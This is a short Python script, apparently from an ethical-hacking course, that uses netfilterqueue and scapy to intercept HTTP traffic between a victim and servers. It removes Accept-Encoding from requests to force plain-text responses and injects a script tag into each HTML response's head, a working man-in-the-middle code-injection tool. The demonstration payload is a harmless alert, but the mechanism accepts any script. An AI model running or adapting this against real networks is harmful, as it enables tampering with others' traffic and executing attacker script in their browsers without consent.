#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load  # url to redirect the client to
    # delete these when you change the packet (scapy will automatically recalculate them)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):  # packet sniffed in the queue
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):  # RR for response (in scapy data with http is in Raw layer)
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:  # if the packet is an HTTP request
            print("[+] Request")
            # remove encoding from the request so that the server will send us the data in plain text
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:  # if the packet is an HTTP response
            print("[+] Response")
            print(scapy_packet.show())
            load = load.replace("</head>", "<script>alert('code injected >:)');</script></head>")

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))  # convert the packet to a string

    packet.accept()  # forward the packet to the target


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
